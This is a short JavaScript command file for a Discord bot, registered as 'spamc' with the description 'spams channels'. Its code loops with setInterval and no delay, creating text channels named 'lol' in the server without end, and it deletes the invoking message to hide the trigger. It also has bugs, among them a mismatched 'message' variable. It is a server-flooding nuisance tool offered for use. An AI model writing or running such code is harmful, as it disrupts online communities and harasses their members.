const Discord = module.require("discord.js");
module.exports.run = async (bot, messages, args) => {
		
    let channel = "lol"
	setInterval(function(){
	messages.guild.createChannel(channel, { type:"text" })
	console.log(`creating channels ${channel}`)
});	
    message.delete(1);
}
module.exports.help = {
    name: "spamc",
    desc: "spams channels"

}

